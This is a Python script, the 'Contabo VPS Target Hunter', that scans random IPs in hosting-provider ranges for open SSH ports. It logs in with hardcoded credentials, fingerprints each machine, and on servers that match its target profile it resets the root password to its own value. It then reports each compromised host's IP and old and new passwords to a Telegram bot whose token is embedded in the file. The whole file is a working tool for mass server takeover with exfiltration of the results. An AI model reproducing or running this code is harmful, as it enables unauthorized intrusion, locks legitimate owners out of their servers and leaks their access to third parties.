#!/usr/bin/env python3
"""
CONTABO VPS TARGET HUNTER
Target Pattern: vmi* hostname, Ubuntu 24.04, 11.7GB RAM, 96GB Storage
Credential: r00t / Hackers
"""

import socket
import paramiko
import threading
import time
import random
import ipaddress
import sys
import logging
import urllib.request
import urllib.parse
import json
import re
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ========== SILENT MODE ==========
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

# ========== CONFIGURATION ==========
THREADS = 2000
TIMEOUT_CONNECT = 0.5
TIMEOUT_SSH = 3
OUTPUT_FILE = "contabo_targets.txt"
NEW_PASSWORD = "sinko@"

# Exact target specifications
TARGET_RAM_MIN = 10.0
TARGET_RAM_MAX = 13.0  # Contabo 11.7GB typical
TARGET_STORAGE_MIN = 80
TARGET_STORAGE_MAX = 120  # Contabo 96GB typical
TARGET_OS_PATTERNS = ["Ubuntu 24.04", "Ubuntu 22.04", "Ubuntu 20.04"]
TARGET_HOSTNAME_PATTERN = r"^vmi\d+"  # vmi2949660 format

# ========== TELEGRAM BOTS ==========
BOTS = [
    {"token": "8820997464:AAEABG5TkAV04udBXPDZ6VAQFDosHf8LSl8", "chat_id": "8336072448"},
    {"token": "8820997464:AAEABG5TkAV04udBXPDZ6VAQFDosHf8LSl8", "chat_id": "8336072448"}
]

# ========== CREDENTIAL ==========
USER = "r00t"
PASSWORD = "Hackers"

# ========== CONTABO SPECIFIC RANGES ==========
CONTABO_RANGES = [
    "95.111.0.0/16",      # Main Contabo (France/Germany) - Target IP in this range
    "173.212.0.0/16",     # Contabo (US/Germany)
    "194.31.0.0/16",      # Contabo (Germany)
    "213.136.0.0/16",     # Contabo (Germany)
    "5.9.0.0/16",         # Contabo (Germany)
    "144.76.0.0/16",      # Contabo (Germany)
    "148.251.0.0/16",     # Contabo (Germany)
    "168.119.0.0/16",     # Contabo (Germany)
    "176.9.0.0/16",       # Contabo (Germany)
    "49.12.0.0/16",       # Contabo (Germany)
    "135.181.0.0/16",     # Contabo (Germany)
    "136.243.0.0/16",     # Contabo (Germany)
    "138.201.0.0/16",     # Contabo (Germany)
    "159.69.0.0/16",      # Contabo (Germany)
    "167.235.0.0/16",     # Contabo (Germany)
    "185.181.0.0/16",     # Contabo (Germany)
    "193.31.0.0/16",      # Contabo (Germany)
    "195.201.0.0/16",     # Contabo (Germany)
]

NETWORKS = []
for r in CONTABO_RANGES:
    try:
        NETWORKS.append(ipaddress.ip_network(r, strict=False))
    except:
        pass
print(f"[✓] Loaded {len(NETWORKS)} Contabo VPS networks")

# ========== STATISTICS ==========
stats = {"scanned": 0, "open": 0, "attempts": 0, "success": 0, "start_time": None, "matched": 0}
stats_lock = threading.Lock()
stop_flag = threading.Event()

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

# ========== FAST PORT SCAN ==========
def is_port_open(ip, port=22):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT_CONNECT)
        result = sock.connect_ex((ip, port))
        if result == 0:
            return True
        return False
    except:
        return False
    finally:
        if sock:
            sock.close()

# ========== SYSTEM INFO COLLECTION ==========
def get_ram_gb(ssh_client):
    """Get exact RAM in GB (like 11.7)"""
    try:
        stdin, stdout, stderr = ssh_client.exec_command("free -m | awk '/^Mem:/ {print $2}'", timeout=3)
        ram_mb = stdout.read().decode().strip()
        if ram_mb and ram_mb.isdigit():
            ram_gb = int(ram_mb) / 1024
            return round(ram_gb, 1)
    except:
        pass
    try:
        stdin, stdout, stderr = ssh_client.exec_command("cat /proc/meminfo | grep MemTotal | awk '{print $2}'", timeout=3)
        mem_kb = stdout.read().decode().strip()
        if mem_kb and mem_kb.isdigit():
            return round(int(mem_kb) / 1024 / 1024, 1)
    except:
        pass
    return 0

def get_storage_gb(ssh_client):
    """Get storage in GB (like 96)"""
    try:
        stdin, stdout, stderr = ssh_client.exec_command("df -BG / | awk 'NR==2 {print $2}' | sed 's/G//'", timeout=3)
        storage = stdout.read().decode().strip()
        if storage and storage.isdigit():
            return int(storage)
    except:
        pass
    try:
        stdin, stdout, stderr = ssh_client.exec_command("df -h / | awk 'NR==2 {print $2}' | sed 's/G//'", timeout=3)
        storage = stdout.read().decode().strip()
        if storage and storage.replace('.', '').isdigit():
            return float(storage)
    except:
        pass
    return 0

def get_hostname(ssh_client):
    try:
        stdin, stdout, stderr = ssh_client.exec_command("hostname", timeout=2)
        hostname = stdout.read().decode().strip()
        return hostname if hostname else "Unknown"
    except:
        return "Unknown"

def get_os_version(ssh_client):
    """Get exact OS version like Ubuntu 24.04.4 LTS"""
    try:
        stdin, stdout, stderr = ssh_client.exec_command("cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"'", timeout=3)
        os_info = stdout.read().decode().strip()
        if os_info:
            return os_info
    except:
        pass
    try:
        stdin, stdout, stderr = ssh_client.exec_command("lsb_release -ds 2>/dev/null", timeout=2)
        os_info = stdout.read().decode().strip()
        if os_info:
            return os_info
    except:
        pass
    try:
        stdin, stdout, stderr = ssh_client.exec_command("uname -a", timeout=2)
        return stdout.read().decode().strip()
    except:
        return "Unknown"

def get_isp_location(ssh_client):
    """Get ISP and location like AS51167 Contabo GmbH, Lauterbourg, FR"""
    isp = "Unknown"
    location = "Unknown"
    try:
        stdin, stdout, stderr = ssh_client.exec_command("curl -s --max-time 4 ipinfo.io 2>/dev/null || wget -qO- --timeout=4 ipinfo.io 2>/dev/null", timeout=5)
        data = stdout.read().decode().strip()
        if data:
            try:
                json_data = json.loads(data)
                isp_raw = json_data.get("org", "Unknown")
                if "AS" in isp_raw:
                    isp = isp_raw
                else:
                    isp = f"AS{json_data.get('asn', '')} {isp_raw}" if json_data.get('asn') else isp_raw
                
                city = json_data.get("city", "")
                country = json_data.get("country", "")
                if city and country:
                    location = f"{city}, {country}"
                elif country:
                    location = country
            except:
                pass
    except:
        pass
    return isp, location

def change_password(ssh_client):
    """Change root password to sinko@"""
    try:
        commands = [
            f'echo "root:{NEW_PASSWORD}" | chpasswd',
            f'echo -e "{NEW_PASSWORD}\\n{NEW_PASSWORD}" | passwd root',
        ]
        for cmd in commands:
            stdin, stdout, stderr = ssh_client.exec_command(cmd, timeout=5)
            error = stderr.read().decode().strip()
            if not error or "success" in error.lower():
                return True
    except:
        pass
    return False

def is_exact_target(ram, storage, hostname, os_version):
    """Check if VPS matches exact target specifications"""
    match_score = 0
    reasons = []
    
    # RAM check (11.7GB typical for Contabo)
    if TARGET_RAM_MIN <= ram <= TARGET_RAM_MAX:
        match_score += 3
        reasons.append(f"RAM: {ram}GB")
    
    # Storage check (96GB typical)
    if TARGET_STORAGE_MIN <= storage <= TARGET_STORAGE_MAX:
        match_score += 2
        reasons.append(f"Storage: {storage}GB")
    
    # Hostname pattern (vmiXXXXX)
    if re.match(TARGET_HOSTNAME_PATTERN, hostname):
        match_score += 3
        reasons.append(f"Hostname: {hostname}")
    
    # OS pattern (Ubuntu 24.04/22.04/20.04)
    for pattern in TARGET_OS_PATTERNS:
        if pattern in os_version:
            match_score += 2
            reasons.append(f"OS: {os_version[:30]}")
            break
    
    return match_score >= 5, reasons

# ========== MAIN ATTACK FUNCTION ==========
def attempt_hack(ip):
    if stop_flag.is_set():
        return False
    
    client = None
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=USER, password=PASSWORD, timeout=TIMEOUT_SSH,
                       allow_agent=False, look_for_keys=False, banner_timeout=2)
        
        # Collect information
        ram_gb = get_ram_gb(client)
        storage_gb = get_storage_gb(client)
        hostname = get_hostname(client)
        os_version = get_os_version(client)
        isp, location = get_isp_location(client)
        
        # Check if exact target
        is_target, reasons = is_exact_target(ram_gb, storage_gb, hostname, os_version)
        
        if not is_target:
            with stats_lock:
                stats["attempts"] += 1
            return False
        
        # Change password
        change_password(client)
        
        # Success! Print exactly like requested format
        print(f"""
{Colors.GREEN}{'='*70}{Colors.RESET}
{Colors.GREEN}[✓] VPS HACKED!{Colors.RESET}
🌐 IP: {Colors.CYAN}{ip}{Colors.RESET}
👤 User: {Colors.YELLOW}{USER}{Colors.RESET}
🔑 Old pass: {Colors.YELLOW}{PASSWORD}{Colors.RESET}
🔐 New password: {Colors.YELLOW}{NEW_PASSWORD}{Colors.RESET}
🏢 Provider: {Colors.CYAN}Contabo GmbH{Colors.RESET}
🖥️ Hostname: {Colors.CYAN}{hostname}{Colors.RESET}
💿 OS: {Colors.CYAN}{os_version}{Colors.RESET}
🧠 RAM: {Colors.CYAN}{ram_gb} GB{Colors.RESET}
💾 Storage: {Colors.CYAN}{storage_gb} GB{Colors.RESET}
🌍 ISP: {Colors.CYAN}{isp}{Colors.RESET}
📍 Location: {Colors.CYAN}{location}{Colors.RESET}
📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{Colors.GREEN}{'='*70}{Colors.RESET}
""")
        
        # Save to file
        with open(OUTPUT_FILE, "a") as f:
            f.write(f"[{datetime.now()}] {ip} | {USER}:{PASSWORD} -> {NEW_PASSWORD} | RAM:{ram_gb}GB | Storage:{storage_gb}GB | {hostname} | {os_version} | {isp} | {location}\n")
        
        # Send Telegram
        msg = (f"✅ <b>VPS HACKED</b>\n"
               f"🌐 IP: <code>{ip}</code>\n"
               f"👤 User: <code>{USER}</code>\n"
               f"🔑 Old pass: <code>{PASSWORD}</code>\n"
               f"🔐 <b>New password: {NEW_PASSWORD}</b>\n"
               f"🏢 Provider: <b>Contabo GmbH</b>\n"
               f"🖥️ Hostname: <code>{hostname}</code>\n"
               f"💿 OS: <code>{os_version}</code>\n"
               f"🧠 RAM: <b>{ram_gb} GB</b>\n"
               f"💾 Storage: <code>{storage_gb} GB</code>\n"
               f"🌍 ISP: <code>{isp}</code>\n"
               f"📍 Location: <code>{location}</code>")
        
        for bot in BOTS:
            try:
                url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
                data = urllib.parse.urlencode({"chat_id": bot['chat_id'], "text": msg, "parse_mode": "HTML"}).encode()
                urllib.request.urlopen(url, data=data, timeout=3)
            except:
                pass
        
        with stats_lock:
            stats["success"] += 1
            stats["matched"] += 1
        return True
        
    except Exception as e:
        return False
    finally:
        if client:
            client.close()
        with stats_lock:
            stats["attempts"] += 1

def scan_and_attack(ip):
    if not is_port_open(ip):
        with stats_lock:
            stats["scanned"] += 1
        return False
    with stats_lock:
        stats["open"] += 1
    return attempt_hack(ip)

def random_ip():
    net = random.choice(NETWORKS)
    if net.prefixlen <= 16:
        parts = str(net.network_address).split('.')
        a, b = parts[0], parts[1] if len(parts) > 1 else "0"
        return f"{a}.{b}.{random.randint(1,254)}.{random.randint(1,254)}"
    offset = random.randint(1, net.num_addresses - 2)
    return str(net.network_address + offset)

def print_stats():
    elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
    with stats_lock:
        sys.stdout.write(f"\r{Colors.YELLOW}[📊] Scanned: {stats['scanned']:,} | Open: {stats['open']} | Attempts: {stats['attempts']:,} | Matched: {stats['matched']} | ✓:{stats['success']} | {elapsed:.0f}s{Colors.RESET}")
        sys.stdout.flush()

def main():
    stats["start_time"] = time.time()
    
    # Send start notification
    start_msg = (f"🚀 <b>Contabo VPS Target Hunter Started</b>\n"
                 f"🎯 Target: {USER}:{PASSWORD}\n"
                 f"📊 Target Specs:\n"
                 f"   • RAM: {TARGET_RAM_MIN}-{TARGET_RAM_MAX}GB\n"
                 f"   • Storage: {TARGET_STORAGE_MIN}-{TARGET_STORAGE_MAX}GB\n"
                 f"   • Hostname: vmi* pattern\n"
                 f"   • OS: Ubuntu 24.04/22.04\n"
                 f"🔐 New password: {NEW_PASSWORD}")
    
    for bot in BOTS:
        try:
            url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
            data = urllib.parse.urlencode({"chat_id": bot['chat_id'], "text": start_msg, "parse_mode": "HTML"}).encode()
            urllib.request.urlopen(url, data=data, timeout=3)
        except:
            pass
    
    print(f"{Colors.GREEN}{'='*70}{Colors.RESET}")
    print(f"{Colors.GREEN}[✓] CONTABO VPS TARGET HUNTER{Colors.RESET}")
    print(f"{Colors.CYAN}📌 Target Credential: {USER}:{PASSWORD}{Colors.RESET}")
    print(f"{Colors.CYAN}📌 Target RAM: {TARGET_RAM_MIN}-{TARGET_RAM_MAX} GB (11.7GB typical){Colors.RESET}")
    print(f"{Colors.CYAN}📌 Target Storage: {TARGET_STORAGE_MIN}-{TARGET_STORAGE_MAX} GB (96GB typical){Colors.RESET}")
    print(f"{Colors.CYAN}📌 Target Hostname: vmi* pattern{Colors.RESET}")
    print(f"{Colors.CYAN}📌 Target OS: Ubuntu 24.04/22.04 LTS{Colors.RESET}")
    print(f"{Colors.CYAN}📌 New password: {NEW_PASSWORD}{Colors.RESET}")
    print(f"{Colors.GREEN}{'='*70}{Colors.RESET}\n")
    
    try:
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = []
            while not stop_flag.is_set():
                ip = random_ip()
                futures.append(executor.submit(scan_and_attack, ip))
                if len(futures) > THREADS * 2:
                    futures = [f for f in futures if not f.done()]
                print_stats()
                time.sleep(0.005)
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Scanner stopped by user{Colors.RESET}")
        stop_flag.set()
    
    elapsed = time.time() - stats["start_time"]
    print(f"\n{Colors.GREEN}{'='*70}{Colors.RESET}")
    print(f"{Colors.GREEN}[✓] SCAN COMPLETED{Colors.RESET}")
    print(f"✅ Exact targets hacked: {stats['success']}")
    print(f"📊 IPs scanned: {stats['scanned']:,}")
    print(f"🎯 Targets matched: {stats['matched']}")
    print(f"⏱️ Time elapsed: {elapsed:.0f} seconds")
    print(f"📁 Results saved to: {OUTPUT_FILE}")
    print(f"{Colors.GREEN}{'='*70}{Colors.RESET}")
    
    stop_msg = f"🏁 <b>Scanner Stopped</b>\n✅ Exact targets: {stats['success']}\n📊 Scanned: {stats['scanned']:,}"
    for bot in BOTS:
        try:
            url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
            data = urllib.parse.urlencode({"chat_id": bot['chat_id'], "text": stop_msg, "parse_mode": "HTML"}).encode()
            urllib.request.urlopen(url, data=data, timeout=3)
        except:
            pass

if __name__ == "__main__":
    main()
